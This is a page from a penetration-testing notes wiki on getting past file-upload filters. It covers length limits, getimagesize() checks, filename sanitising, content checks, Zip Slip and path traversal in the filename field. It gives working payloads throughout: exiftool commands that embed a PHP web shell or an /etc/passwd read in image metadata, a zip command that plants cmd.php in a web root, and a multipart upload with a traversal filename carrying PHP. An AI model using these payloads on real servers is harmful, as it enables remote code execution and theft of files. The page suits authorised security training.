# Other filters/bypass

## File length filter

File length filters are used to prevent huge files being uploaded to the server via an upload form (as this can starve the server of resources). In most cases this will not cause us any problems when uploading shells; however, it is worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is met. For example, our PHP reverse shell (the one from pentest mokey) is 5.4Kb in size - relatively small, but if the form expects a maximum of 2Kb then we would have to find an alternative shell to upload. It may also be that a much larger file is expected.

## PHP getimagesize()

For file uploads that validate the image size via php getimagesize(), it may be possible to run shellcode by inserting it into the Comment attribute of the image properties and saving it as `file.jpg.php`. You can do this with gimp or exiftools:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
# Reference: https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass#php-getimagesize
```

I'm not sure why some tutorials have the php extension first while others have it second. Try both.

## File name filtering

As mentioned above, files uploaded to a server must be unique. Normally this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give an error to the user if it does. In addition, filenames should be sanitized upon upload to ensure that they do not contain any "bad characters", which could cause file system problems upon upload (e.g. null bytes or slashes in Linux, as well as control characters such as ; and potentially unicode characters). What this means for us is that, on a well-managed system, our uploaded files are unlikely to have the same name we gave them before we uploaded them, so be aware that you may have to go hunting for your shell in the event that you manage to bypass content filtering.

## File content filtering

More complicated filtering systems can scan the entire contents of an uploaded file to make sure you are not spoofing its extension, MIME type, and magic number. This is a significantly more complex process than most basic filtering systems employ.

## File Upload + Path Traversal

### Zip slip

Zip Slip is a widespread critical archive extraction vulnerability, allowing attackers to write arbitrary files on the system, typically resulting in remote command execution.

The vulnerability has been found in multiple ecosystems, including JavaScript, Ruby, .NET and Go, but is especially prevalent in Java, where there is no central library offering high level processing of archive (e.g. `zip`) files.

```
zip test.zip ../../../../../../../var/www/html/cmd.php
```

### Path traversal in filename field

{% hint style="danger" %}
Try to use some [encoding or some modification](../inclusion-lfi-rfi-traversal/lfi-rfi-payloads.md#lfi-payloads) in the payload to avoid some filters.
{% endhint %}

```bash
-----------------------------241661251632866372162072905474
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/x-php

<?php system("cat /home/carlos/secret"); ?>
```

## Faulty validation of file content

Rather than implicitly relying on the Content-Type specified in a request, more secure servers attempt to verify that the file content actually matches what is expected.

This is a much more robust way to validate the file type, but even this is not foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG/PNG file that contains malicious code within its metadata.

{% hint style="danger" %}
For this type of evasion, we need a PNG/JPG image to embed malicious metadata and then convert it to a PHP file.
{% endhint %}

```bash
exiftool -Comment="<?php echo '<pre>' . system('cat /etc/passwd') . '</pre>'; ?>" image.png -o test.php
```

## [File Upload via Race Condition](../race-condition/file-upload-via-race-condition.md) <a href="#exploiting-file-upload-race-conditions" id="exploiting-file-upload-race-conditions"></a>
